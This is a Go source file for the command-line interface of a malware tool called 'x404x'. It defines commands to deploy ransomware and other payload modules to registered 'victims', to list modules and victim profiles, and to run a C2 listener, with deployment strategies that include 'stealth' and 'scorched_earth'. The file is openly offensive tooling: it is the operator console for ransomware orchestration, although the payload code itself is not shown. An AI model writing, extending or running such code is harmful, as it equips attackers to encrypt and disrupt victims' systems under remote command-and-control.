package main

import (
	"fmt"
	"strings"

	"github.com/spf13/cobra"
)

func init() {
	payloadCmd := &cobra.Command{
		Use:   "deploy [victim] [modules]",
		Short: "Deploy payload modules to target victim",
		Long:  "Deploy ransomware and Block Z modules to a victim by profile. Use comma-separated module names or 'all' for full deployment.",
		Example: `  x404x deploy victim01 ransomware/execute,blockz/genetic_evolve,z1
  x404x deploy victim02 all
  x404x deploy victim03 --listen-only
  x404x modules list
  x404x victims list`,
		Run: runDeploy,
	}

	payloadCmd.Flags().Bool("listen-only", false, "C2 listen-only mode: receive heartbeats, do not orchestrate attacks")
	payloadCmd.Flags().String("strategy", "stealth", "Deployment strategy: stealth, targeted, scorched_earth")
	rootCmd.AddCommand(payloadCmd)

	modulesCmd := &cobra.Command{
		Use:   "modules",
		Short: "List available payload modules",
	}
	modulesListCmd := &cobra.Command{
		Use:   "list",
		Short: "List modules by category",
		Run:   runModulesList,
	}
	modulesCmd.AddCommand(modulesListCmd)

	categoriesCmd := &cobra.Command{
		Use:   "categories",
		Short: "List module categories",
		Run:   runCategories,
	}
	modulesCmd.AddCommand(categoriesCmd)
	rootCmd.AddCommand(modulesCmd)

	victimsCmd := &cobra.Command{
		Use:   "victims",
		Short: "Manage victim profiles",
	}
	victimsListCmd := &cobra.Command{
		Use:   "list",
		Short: "List registered victims",
		Run:   runVictimsList,
	}
	victimsCmd.AddCommand(victimsListCmd)
	rootCmd.AddCommand(victimsCmd)

	c2Cmd := &cobra.Command{
		Use:   "c2",
		Short: "C2 server commands",
	}
	c2ListenCmd := &cobra.Command{
		Use:   "listen",
		Short: "Start C2 in listen-only mode",
		Run:   runC2Listen,
	}
	c2Cmd.AddCommand(c2ListenCmd)
	rootCmd.AddCommand(c2Cmd)
}

func runDeploy(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		fmt.Println("AppState not initialized")
		return
	}
	if len(args) < 1 {
		fmt.Println("Usage: x404x deploy <victim_id> [modules]")
		fmt.Println("  modules: comma-separated or 'all'")
		return
	}

	victimID := args[0]
	moduleFilter := "all"
	if len(args) >= 2 {
		moduleFilter = args[1]
	}

	listenOnly, _ := cmd.Flags().GetBool("listen-only")
	strategy, _ := cmd.Flags().GetString("strategy")

	dm := state.NewDeploymentManager()
	vp := dm.GetVictim(victimID)
	if vp == nil {
		vp = dm.RegisterVictim(victimID, "unknown", "0.0.0.0", []int{}, []string{})
	}
	dm.ProfileVictim(vp.ID)

	plan, err := dm.CreateDeploymentPlan(vp.ID, moduleFilter)
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return
	}

	fmt.Printf("DEPLOYMENT PLAN: Victim=%s Strategy=%s Modules=%v ListenOnly=%v\n",
		vp.Hostname, strategy, plan.Modules, listenOnly)

	if !listenOnly {
		results := dm.DeployPlan(plan)
		for mod, result := range results {
			status := "OK"
			if strings.Contains(result, "FAILED") {
				status = "FAIL"
			}
			fmt.Printf("  %s -> %s\n", mod, status)
		}
	} else {
		fmt.Println("  [listen-only] Modules queued. C2 will relay but not execute.")
		for _, mod := range plan.Modules {
			fmt.Printf("  queued: %s\n", mod)
		}
	}
}

func runModulesList(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	dm := state.NewDeploymentManager()
	categories := dm.GetModuleCategories()
	for cat, mods := range categories {
		fmt.Printf("[%s] %d modules:\n", cat, len(mods))
		for _, m := range mods {
			fmt.Printf("  %s\n", m)
		}
	}
}

func runCategories(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	dm := state.NewDeploymentManager()
	cats := dm.GetModuleCategories()
	fmt.Println("Module categories:")
	for cat, mods := range cats {
		fmt.Printf("  %-20s : %d modules\n", cat, len(mods))
	}
}

func runVictimsList(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	dm := state.NewDeploymentManager()
	victims := dm.ListVictims()
	if len(victims) == 0 {
		fmt.Println("No victims registered.")
		return
	}
	for _, vp := range victims {
		fmt.Printf("  %s | %s | risk=%.2f | %d modules\n",
			vp.ID, vp.Status, vp.RiskScore, len(vp.ActiveModules))
	}
}

func runC2Listen(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	fmt.Println("C2 LISTEN-ONLY MODE - relaying heartbeats, not orchestrating")
	_ = state
	<-make(chan struct{})
}
